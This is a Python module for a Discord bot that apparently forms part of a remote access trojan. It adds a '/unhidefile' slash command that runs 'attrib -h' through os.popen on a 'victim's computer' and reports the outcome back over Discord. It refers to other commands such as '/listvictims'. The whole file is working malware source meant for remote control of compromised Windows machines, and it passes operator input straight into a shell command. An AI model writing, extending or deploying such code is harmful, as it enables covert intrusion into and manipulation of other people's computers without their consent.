import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class unHideFile(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr                   

    @commands.slash_command( )
    async def unhidefile(self, ctx, victim, file):
        """Unhide hidden file on victim's computer

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        file: File path of the file to be unhidden.
        """
        if str(victim) == str(self.bot.identifier): 

            if '"' in file:
                file = file.replace('"','')
                
            output = os.popen("attrib -h " + '"' + file + '"').read()
            
            if "not" in output: 
                return await ctx.response.send_message(
                    embed = self.bot.genEmbed(
                        "Unable to show file!", 
                        datetime.now(),
                        "Ensure the file path is correct and try again"
                    )
                )
            
            await ctx.response.send_message(
                embed = self.bot.genEmbed(
                    "File unhidden successfully!",
                    datetime.now(),
                    "Path:\n```"+file+"```"
                )
            )
            
def setup(bot: commands.Bot):
    bot.add_cog(unHideFile(bot))